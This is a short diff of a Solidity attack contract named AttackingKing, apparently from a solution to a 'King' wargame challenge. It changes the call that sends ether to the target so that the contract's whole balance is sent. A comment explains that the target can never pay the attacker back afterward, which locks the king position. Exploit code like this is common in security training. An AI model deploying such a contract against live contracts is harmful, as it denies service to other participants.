@@ -15,7 +15,7 @@ contract AttackingKing {
     // transfer from the king contract after we become king will never be succesful
     function hackContract() external {
         address payable kingContract = payable(contractAddress);
-        (bool sent, bytes memory data) = kingContract.call{value: msg.value}("");
+        (bool sent, bytes memory data) = kingContract.call{value: address(this).balance}("");
     }
 
     fallback() external {
